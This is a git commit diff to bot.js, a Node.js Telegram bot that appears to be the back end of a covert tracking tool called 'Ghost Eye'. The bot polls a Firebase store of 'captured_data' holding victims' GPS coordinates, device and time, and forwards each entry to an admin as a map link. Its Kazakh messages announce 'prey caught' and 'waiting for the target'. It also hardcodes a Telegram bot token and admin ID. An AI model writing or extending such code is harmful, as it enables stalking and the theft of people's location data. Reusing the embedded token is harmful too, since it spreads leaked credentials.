61f43d5295f6a1436252dac43adfe1cf88f6248a
GhostAdmin <ghost@browser.com>
2026-04-18 14:48:15 +0500

    Ghost System Live

--- bot.js
+++ bot.js
@@ -3,11 +3,11 @@ const axios = require('axios');
 
 const token = '8673435121:AAE3dl1MLPNc1V7lss4_ygeGmu5eZQXP0bQ';
 const adminId = '7594678193';
-const fbURL = "https://tulpar-system-default-rtdb.firebaseio.com/captured_data.json";
+const fbURL = "https://ghosteye-296b6-default-rtdb.firebaseio.com/captured_data.json";
 
 const bot = new TelegramBot(token, {polling: true});
 
-console.log("Ghost Eye боты іске қосылды...");
+console.log("Ghost Eye боты іске қосылды... Бро, нысананы күтіп отырмын!");
 
 setInterval(async () => {
     try {
@@ -16,13 +16,17 @@ setInterval(async () => {
         if (data) {
             for (let id in data) {
                 if (!data[id].reported) {
-                    const msg = "🎯 ТҮСТІ!\n📍 GPS: https://www.google.com/maps?q=" + data[id].lat + "," + data[id].lng + "\n📱 Device: " + data[id].device;
+                    const mapLink = "https://www.google.com/maps?q=" + data[id].lat + "," + data[id].lng;
+                    const msg = "🎯 ОЛЖА ТҮСТІ!\n\n📍 Карта: " + mapLink + "\n📱 Құрылғы: " + data[id].device + "\n⏰ Уақыт: " + data[id].time;
+                    
                     bot.sendMessage(adminId, msg);
-                    await axios.patch("https://tulpar-system-default-rtdb.firebaseio.com/captured_data/" + id + ".json", {reported: true});
+                    
+                    // Қайталанбауы үшін "reported" деп белгілейміз
+                    await axios.patch("https://ghosteye-296b6-default-rtdb.firebaseio.com/captured_data/" + id + ".json", {reported: true});
                 }
             }
         }
     } catch (e) { }
-}, 4000);
+}, 5000);
 
 bot.onText(/\/start/, (msg) => bot.sendMessage(msg.chat.id, "Ghost System Online. Команда күтілуде..."));
